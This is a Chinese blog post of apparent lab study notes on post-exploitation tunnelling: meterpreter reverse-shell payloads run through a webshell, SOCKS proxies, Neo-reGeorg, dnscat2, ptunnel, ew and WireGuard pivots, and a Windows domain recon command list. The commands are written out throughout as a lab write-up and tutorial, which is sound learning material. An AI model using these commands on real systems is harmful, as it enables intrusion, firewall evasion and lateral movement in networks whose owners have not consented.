+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">启动：
+</span></span><span class="line"><span class="cl">msfconsole
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">配置：
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST 你的攻击机IP
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT <span class="m">4444</span>  <span class="c1"># 端口自己定</span>
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后保持监听，我们再开一个命令行，生成木马文件。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span>端口 -f exe -o shell.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao9.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就生成出来了，然后我们上传到靶机里面去。用webshell运行文件。</p>
+<p><img src="/images/hongri/suidao/suidao10.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到成功连接上了已经。然后我们现在就要开socket代理了，还是这个命令行，我们运行一下命令。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">将会话放到后台运行：
+</span></span><span class="line"><span class="cl">background
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">加载socket攻击模块：
+</span></span><span class="line"><span class="cl">use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">set SRVHOST 0.0.0.0    # 监听所有IP
+</span></span><span class="line"><span class="cl">set SRVPORT 1080       # socks5端口
+</span></span><span class="line"><span class="cl">set VERSION 5          # 使用socks5
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">加载需要的路由：
+</span></span><span class="line"><span class="cl">rount add 内网网段 255.255.255.0 1
+</span></span><span class="line"><span class="cl">rount print
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后其实就搭建好了，但是这个是kali里面的，需要kali自己开代理然后用kali去访问里面的IP什么的，但是这里其实可以接着用MSF打通关就行，但是MSF的命令行还是没有CS的页面好用，这里演示一下吧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use auxiliary/scanner/portscan/tcp
+</span></span><span class="line"><span class="cl">set RHOSTS 192.168.52.1-50
+</span></span><span class="line"><span class="cl">set THREADS 20
+</span></span><span class="line"><span class="cl">run
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao11.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>但是爆的也是有点慢了，感觉不如自己用工具搜集，或者fscan。
+差不多这个暂时到这里，CS的会一直用，可以看打的东西来学习过程。</p>
+<h1 id="应用层封装隧道">应用层封装隧道
+</h1><p>但是有些时候，这些常见的通信是不给的，TCP啊，或者直接的SSH，都是打不了的，而且主机还是不出网的情况，可能就需要一些应用层封装隧道来绕过这些防护去进行内网穿透。下面是比较常见的三种，分别都会介绍一种工具使用。</p>
+<h2 id="http-隧道neo-regeorg">HTTP 隧道：Neo-reGeorg
+</h2><p>先来介绍这种工具搭建隧道的方式。先安装工具吧，
+git clone <a class="link" href="https://github.com/L-codes/Neo-reGeorg.git"  target="_blank" rel="noopener"
+    >https://github.com/L-codes/Neo-reGeorg.git</a>
+然后我们就可以进到他的目录下，生成一个搭建隧道的文件出来。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 生成带密码的隧道脚本（-k 指定密码，必选）</span>
+</span></span><span class="line"><span class="cl">python3 neoreg.py generate -k <span class="m">123456</span>
+</span></span><span class="line"><span class="cl">上传之后：
+</span></span><span class="line"><span class="cl">python neoreg.py -k <span class="m">123456</span> -u http://192.168.200.143/tunnel.php -v --skip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>首先执行生成命令之后，就会出现这些文件。</p>
+<p><img src="/images/hongri/suidao/suidao12.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>我们这里就拿这个PHP来举例了，毕竟环境是PHP环境。直接上传上去。</p>
+<p><img src="/images/hongri/suidao/suidao13.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>直接访问是一个不可见编码的效果，然后我们打命令之后不是监听，但是应该是已经开起来了，我们可以去连接一下看看。</p>
+<p><img src="/images/hongri/suidao/suidao14.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>一开始是命令打错了，需要加上-v和-skip参数才能正常执行，然后我们现在再去访问看看。很奇怪，这里也出问题，不能是今天运气不好吧，按理来说应该已经搭好代理了，但是就是连不上，很奇怪，而且又是我自己的环境，我貌似又能直接访问到，没走代理，就很奇怪。</p>
+<p>简单讲一下这个隧道的原理，是通过这个我们上传的文件，然后传输数据过去，过去之后呢，文件会对数据进行解码，解码完了会进行一个请求的发送，然后就造成了socket5的流量穿过了waf等，直接进行了访问。</p>
+<h2 id="dns-隧道dnscat2">DNS 隧道：dnscat2
+</h2><p>还是老规矩，先下载，还有下载配置项。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/iagox86/dnscat2.git
+</span></span><span class="line"><span class="cl">sudo gem install bundler
+</span></span><span class="line"><span class="cl">sudo bundle install
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">安装好之后就可以启动监听了：
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/dnscat2/server
+</span></span><span class="line"><span class="cl">sudo ruby dnscat2.rb --secret <span class="m">123456</span> -e open
+</span></span><span class="line"><span class="cl">还要在另外一端开一个make：
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/dnscat2/client
+</span></span><span class="line"><span class="cl">make <span class="c1"># 就会生成一个二进制文件，我们直接上到主机上。</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Windows的执行文件要到https://downloads.skullsecurity.org/dnscat2/下载<span class="o">)</span>
+</span></span><span class="line"><span class="cl">然后在被攻击机上面打命令：
+</span></span><span class="line"><span class="cl">dnscat2.exe --dns <span class="nv">server</span><span class="o">=</span>192.168.200.130,port<span class="o">=</span>53 --secret<span class="o">=</span><span class="m">123456</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/hongri/suidao/suidao15.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>然后就可以看到连到了一个会话。然后我们打命令就可以做到端口转发的效果了。</p>
+<p><img src="/images/hongri/suidao/suidao16.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="示例"
+	
+	
+></p>
+<p>可以看到我们这里就把192.168.52.138:80转发到了本地的8080端口，别的都是可以转发的，这里就不演示了。交互命令发一下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">session -i <span class="m">1</span> <span class="c1">#进入会话</span>
+</span></span><span class="line"><span class="cl">listen 0.0.0.0:8080 192.168.52.138:80 <span class="c1">#端口转发</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="icmp-隧道ptunnelping-隧道">ICMP 隧道：ptunnel（Ping 隧道）
+</h2><p>这个我上网搜了一下，大多数都是Linux环境打的，Windows很少有用这个练习的，所以我也没练了，等后面有机会有两台Linux主机了再练吧。这里记录一下命令是哪些。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">被攻击机：
+</span></span><span class="line"><span class="cl">ptunnel -x <span class="m">123456</span> <span class="c1">#开启监听服务</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">kali<span class="o">(</span>攻击机<span class="o">)</span>：
+</span></span><span class="line"><span class="cl">ptunnel -p &lt;被控端IP&gt; -lp &lt;本地端口&gt; -da &lt;内网目标IP&gt; -dp &lt;内网目标端口&gt; -x <span class="m">123456</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">从而内网穿透进去，连接内网IP。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="vpn三级隧道">VPN三级隧道
+</h1><p>这个东西还挺有意思的，简单来说就是将攻击机和被攻击机都拉进来一个虚拟的网段，进这个虚拟网段了自然可以通过这个虚拟的网关去访问任意资源，相当于直接加入了他们的内网，而且是个虚拟人，并没有真实存在，只是通过隧道进来的。
+然后这种就有三个比较常见的工具，这里讲基础的，另外两个都是很具体进阶的。</p>
+<h2 id="wireguard">WireGuard
+</h2><p>先把命令弄下来吧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 安装</span>
+</span></span><span class="line"><span class="cl">apt install wireguard
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个是Linux下载的，然后Windows下载需要去官网上面下载下来。
+<a class="link" href="https://www.wireguard.com/install/"  target="_blank" rel="noopener"
+    >https://www.wireguard.com/install/</a> 但是这里下的是install程序，连不上主机用不了，需要下已编译好的程序，直接用github下就行。https://github.com/kwxiaozhu/wireguard-windows-portable/releases/download/v1.0.3/wireguard.exe。然后传上去，还有一个wg.exe，同目录改一下文件名就行。</p>
+<p>打了半天，以为可以了，结果靶机的版本太低，Windows7，程序运行不了，跑不起来，没事记录一下怎么打的吧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">生成密钥：
+</span></span><span class="line"><span class="cl">wg genkey &gt; privatekey
+</span></span><span class="line"><span class="cl">wg pubkey &lt; privatekey &gt; publickey
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">生成网卡：
+</span></span><span class="line"><span class="cl">sudo ip link add wg0 <span class="nb">type</span> wireguard
+</span></span><span class="line"><span class="cl">sudo ip addr add 10.0.0.1/24 dev wg0
+</span></span><span class="line"><span class="cl">sudo wg <span class="nb">set</span> wg0 listen-port <span class="m">51820</span> private-key privatekey
+</span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> wg0 up
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">查看公钥：
+</span></span><span class="line"><span class="cl">sudo wg show wg0 public-key
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">可以访问内网：
+</span></span><span class="line"><span class="cl">sudo sysctl -w net.ipv4.ip_forward<span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">被攻击机：
+</span></span><span class="line"><span class="cl">wg0.conf配置文件：
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Interface<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PrivateKey</span> <span class="o">=</span> 客户端私钥
+</span></span><span class="line"><span class="cl"><span class="nv">Address</span> <span class="o">=</span> 10.0.0.2/24
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Peer<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PublicKey</span> <span class="o">=</span> 服务端公钥（Kali）
+</span></span><span class="line"><span class="cl"><span class="nv">AllowedIPs</span> <span class="o">=</span> 10.0.0.0/24, 192.168.52.0/24
+</span></span><span class="line"><span class="cl"><span class="nv">Endpoint</span> <span class="o">=</span> 192.168.200.100:51820
+</span></span><span class="line"><span class="cl"><span class="nv">PersistentKeepalive</span> <span class="o">=</span> <span class="m">25</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">启动命令：
+</span></span><span class="line"><span class="cl">wireguard /installtunnelservice wg0.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后就顺利进内网了，还是比较简单的。
+还有另外两个工具稍微介绍一下：</p>
+<ul>
+<li>
+<p>Tailscale（基于 WireGuard 的开箱即用 VPN）：
+本质
+WireGuard + 自动组网 + 内网穿透
+特点</p>
+<p>不需要公网 IP
+自动穿透 NAT
+两台机器无论在哪，都能拉进同一个虚拟局域网
+渗透神器：内外网机器直接互通</p>
+</li>
+<li>
+<p>ZeroTier（类似 Tailscale，更轻）
+本质
+虚拟局域网（P2P VPN）</p>
+</li>
+</ul>
+<h1 id="总结">总结
+</h1><p>最后稍微总结一下遇到的各种隧道，适用情况：</p>
+<ol>
+<li>目标能出网 + 有 SSH 服务（22 端口）
+最优选择：SSH 动态转发（Socks5）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    ssh -D <span class="m">1080</span> user@目标IP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>代理：127.0.0.1:1080 SOCKS5</li>
+<li>适合：<strong>直接可控、能 SSH 登录</strong></li>
+</ul>
+<ol start="2">
+<li>目标能出网，但无法被外网 SSH 连接
+选择：SSH 反向隧道（反弹 Socks5）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    ssh -N -R <span class="m">1080</span> VPS_IP -i 密钥 -o <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no
+</span></span></code></pre></td></tr></table>
+</div>
+</div><pre><code> webshell 下必须用密钥免密，不能输密码
+</code></pre>
+<ol start="3">
+<li>目标能出网，但无 SSH / 不让开端口
+首选：ew 反向 Socks5（最通用、最稳定）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">  攻击机 <span class="o">(</span>VPS<span class="o">)</span>：
+</span></span><span class="line"><span class="cl">    ew -s rcsocks -l <span class="m">1080</span> -e <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">  目标机：
+</span></span><span class="line"><span class="cl">    ew -s rssocks -d VPS_IP -e <span class="m">8888</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>得到：<strong>127.0.0.1:1080 SOCKS5</strong></li>
+<li>适用：Windows/Linux、webshell 直接跑</li>
+</ul>
+<ol start="4">
+<li>需要跨网段、二级跳板（A→B）
+选择：ew 二级隧道（lcx 转发）</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    B：
+</span></span><span class="line"><span class="cl">    ew -s ssocksd -l <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">    A：
+</span></span><span class="line"><span class="cl">    ew -s lcx_tran -l <span class="m">1080</span> -f B_IP -g <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    或者
+</span></span><span class="line"><span class="cl">    A 无法开端口，只能反弹
+</span></span><span class="line"><span class="cl">    攻击机：./ew -s lcx_listen -l <span class="m">1080</span> -e <span class="m">8888</span>
+</span></span><span class="line"><span class="cl">    B：./ew -s ssocksd -l <span class="m">9999</span>
+</span></span><span class="line"><span class="cl">    A：./ew -s lcx_slave -d 攻击机IP -e <span class="m">8888</span> -f B主机IP -g <span class="m">9999</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>攻击机连 A:1080 即可访问内网 B，或者用VPS的端口也行。
+5. 目标不出网，但能出 ICMP（能 ping）
+选择：ICMP 隧道 ptunnel（ping 隧道）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    目标机：
+</span></span><span class="line"><span class="cl">    ptunnel -x 密码
+</span></span><span class="line"><span class="cl">    攻击机：
+</span></span><span class="line"><span class="cl">    ptunnel -p 目标IP -lp 本地端口 -da 内网IP -dp 内网端口 -x 密码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="6">
+<li>目标严格防火墙：只允许 DNS（53 端口）
+选择：DNS 隧道 dnscat2</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    VPS：
+</span></span><span class="line"><span class="cl">    ruby dnscat2.rb --secret 密码 -e open
+</span></span><span class="line"><span class="cl">    目标机：
+</span></span><span class="line"><span class="cl">    dnscat2.exe --dns <span class="nv">server</span><span class="o">=</span>VPS_IP --secret<span class="o">=</span>密码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="7">
+<li>目标WAF 严格，只允许 HTTP/HTTPS
+选择：HTTP 隧道 Neo-reGeorg</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    <span class="c1"># 生成木马</span>
+</span></span><span class="line"><span class="cl">    python3 neoreg.py generate -k 密码
+</span></span><span class="line"><span class="cl">    <span class="c1"># 上传tunnel.php后连接</span>
+</span></span><span class="line"><span class="cl">    python3 neoreg.py -k 密码 -u http://目标IP/tunnel.php -v --skip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>流量伪装成 HTTP，<strong>最绕 WAF</strong>
+8. 已经拿到 MSF/CS 会话</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    MSF：
+</span></span><span class="line"><span class="cl">    use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">    <span class="nb">set</span> SRVPORT <span class="m">1080</span>
+</span></span><span class="line"><span class="cl">    run
+</span></span><span class="line"><span class="cl">    route add 内网段 会话ID
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    CS：
+</span></span><span class="line"><span class="cl">    1. 添加 Listener -&gt; Socks5 代理
+</span></span><span class="line"><span class="cl">    2. 最适合**域渗透、大批量横向**
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="9">
+<li>要完整虚拟网卡、全内网互通（VPN 级别）
+选择：WireGuard / Tailscale</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">    <span class="c1"># 生成木马</span>
+</span></span><span class="line"><span class="cl">    VPS：
+</span></span><span class="line"><span class="cl">    sudo ip link add wg0 <span class="nb">type</span> wireguard
+</span></span><span class="line"><span class="cl">    sudo ip addr add 10.0.0.1/24 dev wg0
+</span></span><span class="line"><span class="cl">    sudo wg <span class="nb">set</span> wg0 listen-port <span class="m">51820</span> private-key privatekey
+</span></span><span class="line"><span class="cl">    sudo ip link <span class="nb">set</span> wg0 up
+</span></span><span class="line"><span class="cl">    目标机：
+</span></span><span class="line"><span class="cl">    wireguard /installtunnelservice wg0.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>相当于攻击机<strong>直接加入内网</strong></li>
+<li>适合：复杂域环境、多网段、长期控制</li>
+</ul>
+<p>还有一个小东西吧，顺便放这里了：</p>
+<h1 id="内网信息收集">内网信息收集
+</h1><p>前面学习了一下内网的信息收集，这里做一个小总结。
+分了两个板块，因为打的命令不一样，所以设置为不一样的东西。</p>
+<h2 id="基本思路">基本思路
+</h2><p>先确定好我们想要去做什么信息收集，需要知道什么，而不是说随便查查，不知道要查什么东西。</p>
+<ol>
+<li>(可能存在) 通过历史漏洞或者suid之类的操作进行提权</li>
+<li>目前主机的基本信息(Windows/Linux，物理机/docker机，主机权限，shell权限)</li>
+<li>确定下一步渗透的目标(网段内其他主机，docker的宿主机，提升权限)</li>
+<li>查看网络连通性以及目标信息(网段内IP存活探测，域后缀名，主机名，ping是否能通)</li>
+</ol>
+<h2 id="windows主机">Windows主机
+</h2><p>我们这里就可以根据我们的基本思路去记录一下常见的命令，提权相关的这里就不说了，最基本的还是会提一下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">提权：
+</span></span><span class="line"><span class="cl">getpid
+</span></span><span class="line"><span class="cl">getsystem
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">主机信息：
+</span></span><span class="line"><span class="cl">systeminfo             # 系统版本、补丁、架构
+</span></span><span class="line"><span class="cl">hostname               # 主机名
+</span></span><span class="line"><span class="cl">whoami /priv           # 当前权限（非常关键）
+</span></span><span class="line"><span class="cl">ipconfig /all             # IP、网关、DNS、域名后缀
+</span></span><span class="line"><span class="cl">route print            # 路由表
+</span></span><span class="line"><span class="cl">arp -a                 # ARP表
+</span></span><span class="line"><span class="cl">net user               # 本机用户
+</span></span><span class="line"><span class="cl">net localgroup administrators  # 管理员组
+</span></span><span class="line"><span class="cl">quser                  # 在线登录用户
+</span></span><span class="line"><span class="cl">netstat -ano           # 端口、连接
+</span></span><span class="line"><span class="cl">tasklist               # 进程
+</span></span><span class="line"><span class="cl">schtasks /query /fo list  # 计划任务
+</span></span><span class="line"><span class="cl">sc query                # 服务
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">%userdomain%</span>      # 看是否是域
+</span></span><span class="line"><span class="cl">net config workstation  # 登录域、工作站信息
+</span></span><span class="line"><span class="cl">nltest /dclist:域名    # 域控IP（知道域名时用）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">渗透目标：
+</span></span><span class="line"><span class="cl">net view                 # 查看局域网内其他主机名
+</span></span><span class="line"><span class="cl">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+</span></span><span class="line"><span class="cl">net user                 # 查看本机用户列表
+</span></span><span class="line"><span class="cl">net user /domain         # 查看域用户
+</span></span><span class="line"><span class="cl">net localgroup administrators # 查看本地管理员组（通常会有域用户）
+</span></span><span class="line"><span class="cl">net view /domain         # 查看有几个域
+</span></span><span class="line"><span class="cl">net user 用户名 /domain   # 获取指定域用户的信息
+</span></span><span class="line"><span class="cl">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+</span></span><span class="line"><span class="cl">net group 组名 /domain    # 查看域中某工作组
+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;domain admins&#34;</span> /domain  # 查看域管理员的名字
+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;domain computers&#34;</span> /domain  # 查看域中的其他主机名
